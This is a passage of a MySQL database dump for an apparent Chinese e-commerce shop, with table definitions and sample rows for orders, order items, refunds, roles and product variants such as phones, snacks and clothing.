  `from_id` char(36) NOT NULL,
  `to_id` char(36) DEFAULT NULL,
  `content` varchar(255) NOT NULL,
  `time` varchar(50) NOT NULL,
  `key` char(36) NOT NULL DEFAULT '基准值，用于判断是否是同一个会话'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_order`
--

CREATE TABLE `shopp_order` (
  `id` char(36) NOT NULL,
  `status` int(2) NOT NULL,
  `user_id` char(36) NOT NULL,
  `order_number` varchar(100) NOT NULL,
  `order_time` varchar(20) NOT NULL,
  `pay_time` varchar(20) DEFAULT NULL,
  `succeed_time` varchar(20) DEFAULT NULL,
  `address_id` varchar(36) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_order`
--

INSERT INTO `shopp_order` (`id`, `status`, `user_id`, `order_number`, `order_time`, `pay_time`, `succeed_time`, `address_id`) VALUES
('0C0E88EF-C792-CE28-6E48-3CF9AD985E41', 5, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1505975164', '1505975164', '1505975184', '', '51ACBD4D-D334-089D-6DE8-B64A3D7889F6'),
('11E1380B-0537-7505-98BF-AD82D532C2FA', 5, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1505361392', '1505361392', '1505361402', '', '51ACBD4D-D334-089D-6DE8-B64A3D7889F6'),
('12EA5C20-98FB-86C3-B793-A9B8592289F1', 8, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1493096384', '1493096384', '1493096387', '', 'F153F405-D18C-499A-6DD1-C5BD5B63FB44'),
('145C9BF4-D775-9C85-D661-688DB9245D1F', 5, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1499406218', '1499406218', '1499406227', '', '51ACBD4D-D334-089D-6DE8-B64A3D7889F6'),
('2096B5B2-4597-768B-FA1B-E7BAE8E15BB1', 7, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1493033113', '1493033113', '1493033120', '', 'F153F405-D18C-499A-6DD1-C5BD5B63FB44'),
('3F488C24-7FEF-1D50-78E1-544C8B75FB03', 7, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1505807619', '1505807619', '', '', '51ACBD4D-D334-089D-6DE8-B64A3D7889F6'),
('512FE8DF-ADB3-550B-B02B-2D003FC28E47', 1, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1511487582', '1511487582', '1511487588', '', '51ACBD4D-D334-089D-6DE8-B64A3D7889F6'),
('525DD590-94CE-91DA-3D82-A74C7ACFA6EA', 8, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1512457243', '1512457243', '', '', '51ACBD4D-D334-089D-6DE8-B64A3D7889F6'),
('5C7D697F-DAFC-2613-F97B-CED60437F40B', 7, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1493055014', '1493055014', '', '', 'F153F405-D18C-499A-6DD1-C5BD5B63FB44'),
('644ED6F9-40DA-D8C8-D04A-4200EAD103E3', 5, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1493096333', '1493096333', '1493096336', '', 'F153F405-D18C-499A-6DD1-C5BD5B63FB44'),
('6C206317-B771-DC3C-F356-EE0F07099A41', 1, '6D9C443A-C6B4-9EAF-CD78-DF28D1BA8780', '1510939263', '1510939263', '1510939271', '', 'EAD041E2-0547-1103-D620-B14E16EDD1A1'),
('78FE5C24-D044-34E4-01FE-CF96B76C6FB0', 5, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1493096365', '1493096365', '1493096369', '', 'F153F405-D18C-499A-6DD1-C5BD5B63FB44'),
('824A9BBF-787C-A9EC-0784-9D7BD377C8E9', 0, '90360C11-DAD9-FAEB-0B35-E5FBA3465373', '1509777490', '1509777490', '', '', '0D6464E2-26F3-1985-70CF-96A3FAC34C10'),
('8EF8FF37-54FD-EDE8-7CC0-0942143AC393', 1, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1493095623', '1493095623', '1499406312', '', 'F153F405-D18C-499A-6DD1-C5BD5B63FB44'),
('936636BE-5A6A-E255-2CF1-EE9D874EEAA3', 1, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1511675516', '1511675516', '1511675522', '', '51ACBD4D-D334-089D-6DE8-B64A3D7889F6'),
('95EFD315-7032-ECAC-3A7E-BE9C7C2CE6F9', 0, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1495012044', '1495012044', '', '', 'F153F405-D18C-499A-6DD1-C5BD5B63FB44'),
('99220CF6-4324-4DDA-0491-67DD002F1D9E', 7, '90360C11-DAD9-FAEB-0B35-E5FBA3465373', '1509772535', '1509772535', '1509772551', '', '0D6464E2-26F3-1985-70CF-96A3FAC34C10'),
('C4F7DFBC-00C0-80AE-833B-C4524906F41F', 3, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1493096283', '1493096283', '1493096292', '', 'F153F405-D18C-499A-6DD1-C5BD5B63FB44'),
('CD461C70-73CF-901F-1A29-9A51FB9EB4C7', 0, '90360C11-DAD9-FAEB-0B35-E5FBA3465373', '1509772652', '1509772652', '', '', '0D6464E2-26F3-1985-70CF-96A3FAC34C10'),
('D0F3B8C1-E407-4ED9-2800-2F78F697D5C3', 5, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1493096350', '1493096350', '1493096354', '', 'F153F405-D18C-499A-6DD1-C5BD5B63FB44'),
('D4D18558-F18A-8099-01DE-EB093B5D5E4F', 3, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1493096307', '1493096307', '1493096312', '', 'F153F405-D18C-499A-6DD1-C5BD5B63FB44'),
('E335688D-CAD2-7A5B-EDCD-2AECCDFF14E1', 0, '6D9C443A-C6B4-9EAF-CD78-DF28D1BA8780', '1511067180', '1511067180', '', '', 'EAD041E2-0547-1103-D620-B14E16EDD1A1'),
('FFBFF8E3-3AA9-E98D-C710-80E3D005D142', 8, 'AA692D26-B786-D8A0-1420-F8F33264485C', '1497255898', '1497255898', '', '', '51ACBD4D-D334-089D-6DE8-B64A3D7889F6');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_order_specification`
--

CREATE TABLE `shopp_order_specification` (
  `id` char(36) NOT NULL COMMENT '单订和规格的中间表',
  `order_id` char(36) NOT NULL,
  `specification_id` char(36) NOT NULL,
  `count` int(10) NOT NULL,
  `price` varchar(10) DEFAULT NULL,
  `specificationcontent` varchar(250) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_order_specification`
--

INSERT INTO `shopp_order_specification` (`id`, `order_id`, `specification_id`, `count`, `price`, `specificationcontent`) VALUES
('004CA805-6687-3E69-F969-C9305D16C668', '11E1380B-0537-7505-98BF-AD82D532C2FA', 'B3A7547B-21AE-FBA4-EBD0-28C1EE3E416E', 1, '2589', 'X9官方标配'),
('06347A6E-8023-1E4A-6D0F-2053D9E2562E', '78FE5C24-D044-34E4-01FE-CF96B76C6FB0', '34DD6B60-DBE4-A183-C076-2ECABBF83A6C', 1, '20', '装系统'),
('152F888E-DDF2-64CE-40B3-BECCF8A31263', '8EF8FF37-54FD-EDE8-7CC0-0942143AC393', '9F2AA23F-FD6B-CC49-55F8-EF5F403D4296', 1, '8999', '6G运存+128G内存玫瑰金'),
('29D69EF0-52D2-2D38-9768-1F96A0B02155', '95EFD315-7032-ECAC-3A7E-BE9C7C2CE6F9', '7897433D-81EB-C106-90CC-BA8A9A1C8DA5', 1, '3000', '官方标配'),
('3213359A-3FA9-77EC-B1B2-442D36805118', '99220CF6-4324-4DDA-0491-67DD002F1D9E', 'B226B65E-127E-4991-C3B8-6E3127B79055', 3, '8', '2两加鸡腿'),
('539E5507-9E1A-7C03-616B-02F3C9F301B9', '0C0E88EF-C792-CE28-6E48-3CF9AD985E41', '843E945A-620F-292E-F2E8-D5FFF45F76B0', 1, '18', '绿豆沙'),
('58B3C603-A9EF-85B0-C666-BBAD7D387849', '3F488C24-7FEF-1D50-78E1-544C8B75FB03', '4C4138B7-0E86-01A1-2432-87B3D1B9C320', 4, '35', '浅绿色'),
('609BBF8D-43BC-B025-184E-4AA673E7D16F', '145C9BF4-D775-9C85-D661-688DB9245D1F', '982053A9-49B6-5D90-754F-4A94B4C67133', 1, '1699', '官方标配'),
('61F0C10B-3931-45D7-81BE-CB7021BDA390', 'E335688D-CAD2-7A5B-EDCD-2AECCDFF14E1', '3C5F6EDD-6979-1DAE-A071-021A3155D3C3', 1, '1809', '套餐二'),
('6AF77F22-9FF6-6173-23EE-04953413B8FC', 'E335688D-CAD2-7A5B-EDCD-2AECCDFF14E1', 'C5F9E72E-411D-EBE1-BB9B-C03F32FB9685', 1, '1400', ' 官方标配:白色'),
('7C5BC3EB-3390-8A3D-656D-4F1EC59E2F5B', '2096B5B2-4597-768B-FA1B-E7BAE8E15BB1', 'B226B65E-127E-4991-C3B8-6E3127B79055', 1, '8', '2两加鸡腿'),
('865CB4CC-0D53-8226-5F0B-037882B9251C', 'CD461C70-73CF-901F-1A29-9A51FB9EB4C7', 'A5240E16-887D-D01F-1779-26E854A18728', 3, '2800', '官方标配 :黑色'),
('8E8226EC-ED4F-D354-C1BA-6270A395DF5D', '8EF8FF37-54FD-EDE8-7CC0-0942143AC393', '9C4A4A94-DBAB-20BB-1D39-FE3EB8CD3810', 3, '15', '巧克力'),
('935213CE-1E3B-D2B2-95AC-2EA4BD9FC369', 'C4F7DFBC-00C0-80AE-833B-C4524906F41F', 'B226B65E-127E-4991-C3B8-6E3127B79055', 1, '8', '2两加鸡腿'),
('95E53711-7B41-A1D8-2CF1-DB47FCEB44E6', '824A9BBF-787C-A9EC-0784-9D7BD377C8E9', 'B226B65E-127E-4991-C3B8-6E3127B79055', 1, '8', '2两加鸡腿'),
('A44EB969-7A8D-FEF6-56AC-F7C914FAEA1E', '6C206317-B771-DC3C-F356-EE0F07099A41', 'EB21D608-1429-C0C9-6C6F-BA289F2085EC', 2, '3999', '32G/玫瑰金'),
('A68740C1-A304-61FD-D0F7-EC467BA64F56', '512FE8DF-ADB3-550B-B02B-2D003FC28E47', 'B226B65E-127E-4991-C3B8-6E3127B79055', 1, '8', '2两加鸡腿'),
('B20D36B2-CCE2-C651-BEB5-33961FA16EAE', '525DD590-94CE-91DA-3D82-A74C7ACFA6EA', '145290C9-874B-5D9F-1244-7EC3589008AD', 1, '5', '48V'),
('BE926A38-4F4B-E558-5355-462A3705E196', '936636BE-5A6A-E255-2CF1-EE9D874EEAA3', '6FDB0463-675B-28C5-0E4B-7FC075D32582', 1, '10', '72V'),
('C0E153D3-2F5F-4BDD-EC2F-D7886696D401', 'D4D18558-F18A-8099-01DE-EB093B5D5E4F', '1046434A-EE73-98CE-1644-4BED07717B27', 1, '9', '单托盘'),
('CAEE9E79-8C85-A650-0821-708BEC771B76', 'D0F3B8C1-E407-4ED9-2800-2F78F697D5C3', '982053A9-49B6-5D90-754F-4A94B4C67133', 1, '1699', '官方标配'),
('D0C4966E-72BB-9124-D186-F7A5ADF67C5E', '5C7D697F-DAFC-2613-F97B-CED60437F40B', '66F54AFF-5424-9FBE-C3CC-6761C474C093', 1, '32', '粉红色'),
('D4891B39-9CBC-FF92-910C-C7DE6A80DC06', 'FFBFF8E3-3AA9-E98D-C710-80E3D005D142', '1FFC4E4C-B777-D0B5-2B79-766B35713043', 1, '7000', '官方标配1台'),
('DB9CB86C-2169-9117-B19F-9C536E983A72', '644ED6F9-40DA-D8C8-D04A-4200EAD103E3', '9C4A4A94-DBAB-20BB-1D39-FE3EB8CD3810', 1, '15', '巧克力'),
('E9DF089D-75F6-E733-C4CA-52EA167FA1F8', '3F488C24-7FEF-1D50-78E1-544C8B75FB03', '48305973-85B5-63FF-5D12-B503B2C7A7E6', 5, '78', '小款白色');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_refunds`
--

CREATE TABLE `shopp_refunds` (
  `id` char(36) NOT NULL COMMENT '货退表',
  `order_specification_id` char(36) NOT NULL,
  `type` varchar(100) NOT NULL,
  `content` varchar(250) NOT NULL,
  `order_id` char(36) NOT NULL,
  `creation_time` varchar(50) NOT NULL,
  `status` varchar(10) NOT NULL,
  `user_id` char(36) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_refunds`
--

INSERT INTO `shopp_refunds` (`id`, `order_specification_id`, `type`, `content`, `order_id`, `creation_time`, `status`, `user_id`) VALUES
('0E7166B7-F411-B3D1-7F30-26867165FFB4', '06347A6E-8023-1E4A-6D0F-2053D9E2562E', '0', '不好', '78FE5C24-D044-34E4-01FE-CF96B76C6FB0', '1493097038', '0', 'AA692D26-B786-D8A0-1420-F8F33264485C'),
('DEE5FBD3-8F7F-CE3B-349C-15D3A0715C5E', 'CAEE9E79-8C85-A650-0821-708BEC771B76', '2', '质量不好，不好用', 'D0F3B8C1-E407-4ED9-2800-2F78F697D5C3', '1493096998', '0', 'AA692D26-B786-D8A0-1420-F8F33264485C');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_role`
--

CREATE TABLE `shopp_role` (
  `id` char(36) NOT NULL,
  `content` varchar(250) NOT NULL,
  `describe` varchar(250) NOT NULL,
  `authority_id` char(36) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_specification`
--

CREATE TABLE `shopp_specification` (
  `id` varchar(36) NOT NULL,
  `content` varchar(250) NOT NULL,
  `price` double(20,0) NOT NULL,
  `repertory` int(10) NOT NULL,
  `commodity_id` varchar(36) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_specification`
--

INSERT INTO `shopp_specification` (`id`, `content`, `price`, `repertory`, `commodity_id`) VALUES
('023EDF9B-3ED9-935A-81A1-FA3CC96E169C', '棕色', 4, 300, '179149C6-2255-FAA2-F9F8-CA6608080FAA'),
('047856A0-44BB-884C-1524-588F079D3BBE', '60V', 7, 6, 'B1096A78-4A70-39E0-EBE4-3523CE963812'),
('0503FD47-F7B9-53F3-B0E7-3BA8F5D10F05', '西部牛仔', 28, 588, '629BAE4F-B30D-D852-BFE6-A43A373A2ED8'),
('06E57510-C770-4863-BAAD-BDA23210E8A4', '套餐类型: 官方标配 ', 2780, 8, 'F7B2B9AF-0CE7-BCFA-194D-842C08DEA654'),
('0959E8FD-75B4-F041-9820-C0038FDD68DD', '官方标配 :银色', 2800, 198, 'C3E30939-86EB-730F-900E-17B582155781'),
('0A62F5C5-DD15-C6E0-8F6B-C5662E9F7B73', '综合口味', 18, 14, '89C19CC9-AADE-EF8F-3D2A-FD244AC2C51D'),
('0D1906BE-F994-5DDE-6269-D6C7890DE379', 'M L XL 2XL', 2999, 200, '511676D4-6E5E-A943-02D2-23838D8A4B2A'),
('0D6B0C51-712A-6270-08E9-39811DA6A3D1', '350g', 20, 997, 'B45A2DB7-6698-C70C-1AD5-94E3E5E7E6A1'),
('0DD899E6-6D05-44B9-E873-5F5EC3A8EED4', '美的吸尘器', 366, 32, 'B5037D54-D3D0-F1EE-5939-523BCBF8F2C6'),
('0E034B9B-648E-48D1-78D6-B0D615B6E06F', '165/84(S)', 90, 90, '26C82144-FCFB-AA3A-150D-2640FFF623F2'),
('0EF2F6DF-6CAE-7DEE-9507-F4DC2C913AFB', '官方标配 :金色', 2500, 2100, 'C3E30939-86EB-730F-900E-17B582155781'),
('1046434A-EE73-98CE-1644-4BED07717B27', '单托盘', 9, 31, '3BAADFC7-A792-40D4-6BF3-978F5F868196'),
('119CD58F-4126-CF58-BEC2-1567ADB34E05', '1800x2000mm', 2000, 200, 'D708E35B-239A-0E3B-3988-B7EA5C3A3066'),
('143FDD53-49C8-A58C-CEC6-740FD97D479E', '1件', 179, 200, 'FEF2C2E1-6304-F2CF-C1C7-EA18C9C219EC'),
('145290C9-874B-5D9F-1244-7EC3589008AD', '48V', 5, 9, 'B1096A78-4A70-39E0-EBE4-3523CE963812'),
('1789246F-6560-1F5D-2584-704C0918A719', 'M LS M', 2000, 100, '753C793E-1F5D-1DC7-4103-A23D23E016C2'),
('1D359FA7-6C41-BB91-95DB-55EAF84BB9E4', '黑色', 2799, 0, 'DBDD6F97-71D8-FF7D-843F-33A2DA965DE1'),
('1DEB1723-8394-4603-B617-24437A8DB27A', '三好学生', 28, 687, '629BAE4F-B30D-D852-BFE6-A43A373A2ED8'),
('1FFC4E4C-B777-D0B5-2B79-766B35713043', '官方标配1台', 7000, 2293, '22B10E64-2792-9976-E179-2481FBD15CB5'),
('209CF837-B514-76ED-4839-BF003468C806', '420L', 250, 5200, 'FF815C07-E3C4-C632-F29C-42FE92C32AF9'),
('2627F13D-D154-2456-B832-88CB1B3A365E', 'AEJE 5.1家庭影院音响套装', 1988, 166, '241411DE-FEBB-E3B4-4FE8-F73BDE54B32B'),
('293F5C8B-7ACC-89CF-198F-1087811B8C68', '草莓味120g', 20, 67, 'F51D327E-3EFE-0E64-BA0A-E122DB83F189'),
('2E0E5BC1-3A74-DC36-42D0-20F59E7E4924', '套餐一', 1709, 14, '4CF00EB1-8CBA-C3D9-F93F-DF01511391BE'),
('2FEFA017-CE86-0951-209D-5576F2F4941F', '显示器不亮', 50, 1000, '77EEE012-05EE-A678-1E84-C30C7FE185AD'),
('30867603-E36D-DF65-AD11-7D6B790CE0B4', '即热净水吧（一机一芯）', 535, 233, 'BEC94BE7-D1A0-D643-6B2D-2FAA1F68B2FD'),
('33408E74-4295-6354-1CE4-6E50432676EC', 'S码', 99, 10, 'B33E6242-90AA-0E1A-17AE-3B2F7C20FBC1'),
('34DD6B60-DBE4-A183-C076-2ECABBF83A6C', '装系统', 20, 999, '77EEE012-05EE-A678-1E84-C30C7FE185AD'),
('351CB270-9EFB-FF1A-9D2F-E8337A56D3F6', '原味120g', 17, 136, 'F51D327E-3EFE-0E64-BA0A-E122DB83F189'),
('38BE888F-837B-B57D-E0ED-FB358C7AF49A', '一件', 200, 2000, '96A28FC7-E21C-2185-D3BC-4DD5FE91ADB7'),
('39E32F9D-5427-4A46-FA11-C97752DEE281', '请致电商议', 1, 5000, '5CA23A19-E354-364B-17A8-0E98A7DB53D0'),
('3AC7FBBC-B991-E51A-6535-A3A8C851C1B4', '2两', 5, 500, '76B76EF4-179E-352C-2A1B-1A7020C43172'),
('3BA5EB3D-0119-1B55-2C0C-402066D4EC65', '组合2100g', 55, 298, '6275F89C-A2A1-8B7B-A259-94926A84C442'),
('3BE1F4C9-E437-BAD8-9019-423F492CF6B8', '16G/玫瑰金', 2999, 29, '72599D9A-E2FE-0D2C-B74A-DBDE17AA0E2E'),
('3C0C3BE6-CEBF-931C-FB6D-2FA4B34B39D8', '第二版', 33, 40, '61F54F17-89B5-A2B6-2A20-353A55A4F6D5'),
('3C5050DC-8239-FCDF-25A2-1047B0C2CA28', '16G/银色', 2999, 30, '72599D9A-E2FE-0D2C-B74A-DBDE17AA0E2E'),
('3C5F6EDD-6979-1DAE-A071-021A3155D3C3', '套餐二', 1809, 9, '4CF00EB1-8CBA-C3D9-F93F-DF01511391BE'),
('3FC5CCB0-0160-34C4-E181-C419F0070958', '100g', 23, 200, 'F7BC08D4-A15A-0784-3456-04EE6D29C689'),
('406DEDB1-A1C0-7814-EAA6-8E80EEA2A97E', '绿色', 4, 188, '179149C6-2255-FAA2-F9F8-CA6608080FAA'),
('4549C0D8-3A4F-A148-4B47-A44DED568182', '180g', 28, 15, 'B7391928-0D76-8E49-8911-CF772446F9C1'),
('467E4794-E139-9D4C-A001-648467AE4B50', 'M码', 199, 9, 'B33E6242-90AA-0E1A-17AE-3B2F7C20FBC1'),
('48305973-85B5-63FF-5D12-B503B2C7A7E6', '小款白色', 78, 13, '47D002AB-DFA4-11CF-52FB-398122144EF1'),
('4C4138B7-0E86-01A1-2432-87B3D1B9C320', '浅绿色', 35, 22, '63D87121-EC06-A576-DE0F-386A49F4243B'),
('4DE8263A-D6D5-FCC7-BA84-3546BDA23534', '普通款', 20000, 6, '8AF4E387-5D09-9D99-DBC7-A22396BE2E51'),
('501BCF11-3BC4-756F-5343-FF22FE148F44', '运动少女', 28, 788, '629BAE4F-B30D-D852-BFE6-A43A373A2ED8'),
('50A8C127-D779-B34B-90CA-034D691B382B', '双托盘', 36, 36, '3BAADFC7-A792-40D4-6BF3-978F5F868196'),
('5154BE5E-5B67-5130-A5DD-C2DE690E2314', '大量冬瓜', 2, 5000, '54BD8F84-B0F0-2F73-E5AE-DFB102E48C79'),
('525BAE0A-4415-3A40-769A-564DBF4F55FB', 'M L XL 2XL', 2999, 200, '900AA834-8BF4-9826-3239-01487EF71BED'),
('55074F79-EE7B-88F4-529F-EDF88A93E753', '小款红色', 68, 15, '47D002AB-DFA4-11CF-52FB-398122144EF1'),
('55FAD44C-67D4-2BB1-EBD4-77A0FAA366F6', '不能开机', 50, 1000, '77EEE012-05EE-A678-1E84-C30C7FE185AD'),
('572956AB-6B5B-7610-5CD0-3EB3D559B13F', '03水润 红橙色', 55, 10, '72387161-B237-7FC1-3FB3-E78C23533C5C'),
('583AD147-7DC7-4E13-A4F2-59ADDF81F1D0', '1件', 20, 200, '37B10231-4225-C269-DB28-F1C40A6CA448'),
('62D3D37D-0296-399E-2CB3-19C605001768', '200g', 45, 266, 'F7BC08D4-A15A-0784-3456-04EE6D29C689'),
('64D63924-E57B-C610-6CEF-4E528BE1D391', '高配2K高清版', 999, 7, '1C26D516-A5F1-7C2E-7158-8A658A3F9083'),
('66F54AFF-5424-9FBE-C3CC-6761C474C093', '粉红色', 32, 44, '63D87121-EC06-A576-DE0F-386A49F4243B'),
('68E71FFA-D7C0-874D-76A2-4A4C4F33D3B9', '金色', 2899, 11, 'DBDD6F97-71D8-FF7D-843F-33A2DA965DE1'),
('6C584A55-081F-D42C-F5F4-9F6810931FF9', '160抽', 13, 200, 'F396C933-04BC-E46D-012F-AE67F7DD37EE'),
('6E4D44E5-6E5D-3ECE-C1DA-9D6A3BB1FA56', '200ml', 102, 200, 'E1A02C6D-C1C6-A748-983D-A236648BDCD4'),
('6FDB0463-675B-28C5-0E4B-7FC075D32582', '72V', 10, 14, 'B1096A78-4A70-39E0-EBE4-3523CE963812'),
('767B904F-ACB2-7C50-C91A-1C4279AF0935', '10片装', 50, 666, 'AE6D4A9D-7257-836A-2687-8EE3B440594E'),
('7789A9EC-3B7A-403B-92D6-261B0E135D5D', 'S码；白色', 199, 10, '25AA487A-1A8F-A2A1-E1B5-78EA0EEC85A3'),
('7897433D-81EB-C106-90CC-BA8A9A1C8DA5', '官方标配', 3000, 1994, '38B3FE41-5AB1-F2AF-3446-7E07D8DD8851'),
('7B55E916-FE4D-F45C-51F5-361534DA9651', '32G/黑色', 3999, 45, '72599D9A-E2FE-0D2C-B74A-DBDE17AA0E2E'),
('82DEE154-BF19-E15F-A6DD-02630F4571BE', '官方', 299, 10, '28FDD4CE-5DC6-FC44-58EE-47ABB5B33BCF'),
('84231135-44F5-BA48-ADBE-4F2377042F68', '600g', 68, 200, 'F72A0711-12B1-2360-6A79-023E0A6FB6BF'),
('843E945A-620F-292E-F2E8-D5FFF45F76B0', '绿豆沙', 18, 12, '1581855B-4F44-E6F1-8E95-59AD9A5A0C5D'),
('850BB1F2-58D2-5D4E-9E99-1CA26DB1CD9B', '黑色', 4, 198, '179149C6-2255-FAA2-F9F8-CA6608080FAA'),
('896FE607-CCC9-A127-D58D-2107ABF157F9', '09水润 砖红色', 55, 40, '72387161-B237-7FC1-3FB3-E78C23533C5C'),
('8BABF928-1F7F-06CA-4EED-C9719DE65CAC', '白色', 4, 200, '179149C6-2255-FAA2-F9F8-CA6608080FAA'),
('8DC8D527-3111-C885-E49C-C3FFE4778F78', '组合1050g', 35, 200, '6275F89C-A2A1-8B7B-A259-94926A84C442'),
('8F1748AD-30E8-7A09-D78D-7ACAE9E8F711', '第一版', 23, 33, '61F54F17-89B5-A2B6-2A20-353A55A4F6D5'),
('91A69DE8-42FD-AC07-9A96-90139AED13D5', '微辣', 19, 160, '92BAFEFD-CCE6-03EF-60A8-DF9954DDDCA9'),
('9447434E-CF88-2D18-D91C-3D7DFBFEC555', '香辣', 20, 198, '92BAFEFD-CCE6-03EF-60A8-DF9954DDDCA9'),
('946EEAB5-63B3-F191-6D30-97E7C7DAFD77', '海盗王子', 28, 566, '629BAE4F-B30D-D852-BFE6-A43A373A2ED8'),
('95A55D72-A26A-44A6-7146-1C20E2976DEE', '300g', 68, 20, 'B7391928-0D76-8E49-8911-CF772446F9C1'),
('982053A9-49B6-5D90-754F-4A94B4C67133', '官方标配', 1699, 12, '4CF00EB1-8CBA-C3D9-F93F-DF01511391BE'),
('9BC0A861-E019-15A1-1C13-BE5780F9F497', '官方', 23, 68, '2D089988-6636-BF15-676F-15A6AED0433F'),
('9C4A4A94-DBAB-20BB-1D39-FE3EB8CD3810', '巧克力', 15, 9, '1581855B-4F44-E6F1-8E95-59AD9A5A0C5D'),
('9F2AA23F-FD6B-CC49-55F8-EF5F403D4296', '6G运存+128G内存玫瑰金', 8999, 34, '433DA60D-5065-1301-48B8-76D1BB06CDF0'),
('A024260D-F1BD-ED7E-2672-990E92B46CEB', 'M码', 356, 200, '6D025479-654E-5D3F-2B6D-ECF783A2D918'),
('A5240E16-887D-D01F-1779-26E854A18728', '官方标配 :黑色', 2800, 197, 'C3E30939-86EB-730F-900E-17B582155781'),
('A6AEDA1E-BA6A-FF55-1EF0-A4AAC37E9B89', '白色', 30, 343, '63D87121-EC06-A576-DE0F-386A49F4243B'),
('A927A4FD-79FA-7DE2-F15C-2EEDDD0A5EC5', '四件套', 178, 200, 'FB498C2A-0CB1-403B-A836-D602ABC96AB8'),
('ACF18B6E-E144-8F47-ED60-EB9A447C7A9B', '深棕色', 20, 66, '00D84306-7B0D-F027-28E4-09D70124D2CB'),
('B0EB8443-EC51-0147-8158-48E572A864AF', '4G运存+64G内存玫瑰金', 5099, 30, '433DA60D-5065-1301-48B8-76D1BB06CDF0'),
('B226B65E-127E-4991-C3B8-6E3127B79055', '2两加鸡腿', 8, 492, '76B76EF4-179E-352C-2A1B-1A7020C43172'),
('B3A7547B-21AE-FBA4-EBD0-28C1EE3E416E', 'X9官方标配', 2589, 182, 'B4052C46-F17D-CBD1-4BCF-29DF877B6FA5'),
('B8F3C770-F934-26BB-5FFE-FA59BF184ACB', 'M码；红色', 299, 10, '25AA487A-1A8F-A2A1-E1B5-78EA0EEC85A3'),
('BB5A2840-D585-DA99-C8A2-BDC51DD5BF01', '1两', 3, 500, '76B76EF4-179E-352C-2A1B-1A7020C43172'),
('BBA63FF3-F72F-3255-2CE8-862C13A1A61B', '16G/金色', 2999, 30, '72599D9A-E2FE-0D2C-B74A-DBDE17AA0E2E'),
('BDE33C6F-A44C-ECC3-4585-6B493AD223F3', '白色普通版', 800, 20, '1C26D516-A5F1-7C2E-7158-8A658A3F9083'),
('BE3CB921-D7EF-AFD4-863A-630BDFD766D5', '62g', 19, 1000, '934AE8D8-B061-C383-3FE1-6566C597B7F4'),
('C5F9E72E-411D-EBE1-BB9B-C03F32FB9685', ' 官方标配:白色', 1400, 198, '8C5CBC3B-C3A0-F078-2DC1-DD276D203A5E'),
('C6985FDC-DD7A-598F-A9A0-D0BF9FE2695F', '浅棕色', 20, 56, '00D84306-7B0D-F027-28E4-09D70124D2CB'),
('CDA2C9DC-482C-A22F-4809-514EB6A9F0C9', '绿豆面膜泥', 273, 49, 'B763DD16-2E58-C493-0434-3952FA160C17'),
('D29F12CC-3CCF-5749-E84F-BD61DAC7E61C', '黑色普通版', 800, 26, '1C26D516-A5F1-7C2E-7158-8A658A3F9083'),
('D536225B-D004-D9FE-B36B-550BFF96CE69', '01水润 复古红', 66, 20, '72387161-B237-7FC1-3FB3-E78C23533C5C'),
('D5674812-6FFF-EF63-0FB9-34BD9BB48760', '3两', 6, 500, '76B76EF4-179E-352C-2A1B-1A7020C43172'),
('D71DB000-D9C0-5A60-06C6-8E0941F13120', '500g', 50, 99, 'EE5D2613-2760-F18C-A447-B8E744FF509D'),
('D91F077D-5443-F9AA-877A-BD43D3A9B302', '4G运存+64G内存 银钻灰', 6099, 20, '433DA60D-5065-1301-48B8-76D1BB06CDF0'),
('DA7CCCC7-2474-D9E5-EC31-4F41FDC62502', '170/88(M)', 100, 50, '26C82144-FCFB-AA3A-150D-2640FFF623F2'),
('DF488BBD-8100-53C5-F9CE-75C26DA2A52A', '大款白色', 109, 23, '47D002AB-DFA4-11CF-52FB-398122144EF1'),
('DFA2AC79-D96D-7549-1166-3D71523B7483', '灰棕色', 20, 34, '00D84306-7B0D-F027-28E4-09D70124D2CB'),
('E3387241-DFB4-7485-DC85-827FF9BA7FD4', '260g', 10, 500, 'D5CD3549-48F1-F39A-F547-EF40372ECC5D'),
('E9D96852-326D-478C-3C5B-572E70DF5A42', '1本', 20, 200, '6FFC6691-7F05-8AB8-B1E1-5C839BB4F446'),
('EB21D608-1429-C0C9-6C6F-BA289F2085EC', '32G/玫瑰金', 3999, 48, '72599D9A-E2FE-0D2C-B74A-DBDE17AA0E2E'),
('EBC84995-D743-5EBE-732F-B618BDCD4AF2', '紫色', 299, 565, 'D678064A-D80E-EFA2-4A01-873583FF3E9B'),
('ED97B124-E688-6ECF-A883-8D991264F1FA', '深灰色', 20, 27, '00D84306-7B0D-F027-28E4-09D70124D2CB'),
('EDC4FAFF-BFBB-C4F1-763C-31011210F0CE', '正常规格 ：50ml', 50, 49, 'D2BCDC64-0970-3775-3193-6D870A490A84'),
('F16FAE0A-87AE-EC9A-2F62-9638A1E3CDE7', '请致电商议', 1, 6000, '0F0CD553-FCD9-655A-228F-1F57509DD264'),
('F1760A94-ED0E-A49F-335C-83A7319DB9B8', '小黄人', 28, 888, '629BAE4F-B30D-D852-BFE6-A43A373A2ED8'),
